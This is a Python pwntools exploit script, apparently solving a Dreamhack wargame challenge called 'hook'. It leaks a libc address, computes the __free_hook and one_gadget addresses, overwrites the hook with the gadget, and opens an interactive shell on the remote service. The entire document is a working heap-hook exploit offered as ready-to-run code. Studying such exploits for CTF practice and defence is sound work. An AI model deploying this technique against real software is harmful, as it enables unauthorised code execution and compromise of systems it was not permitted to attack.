from pwn import process, remote, ELF, success, p64

p = remote('host3.dreamhack.games', 23123)
e = ELF('./a/hook')
libc = ELF('./a/libc-2.23.so')

# 1. Calculate oneshot gadget absolute address on memory at runtime
p.recvuntil(b'stdout: ')
stdout_addr = int(p.recvuntil(b'\n'), 16)
libc_addr = stdout_addr - libc.symbols['_IO_2_1_stdout_']
free_hook_addr = libc_addr + libc.symbols['__free_hook']
one_gadget_addr = libc_addr + [0x45226, 0x4527a, 0xf03a4, 0xf1247][1]

success(f'stdout_addr: {hex(stdout_addr)}')
success(f'libc_addr: {hex(libc_addr)}')
success(f'__free_hook addr: {hex(free_hook_addr)}')
success(f'one_gadget_addr: {hex(one_gadget_addr)}')

# 2. hook overwrie
payload = p64(free_hook_addr)
payload += p64(one_gadget_addr)
p.sendlineafter(b'Size: ', str(len(payload)))                # Just big big number
p.sendlineafter(b'Data: ', payload)

p.interactive()
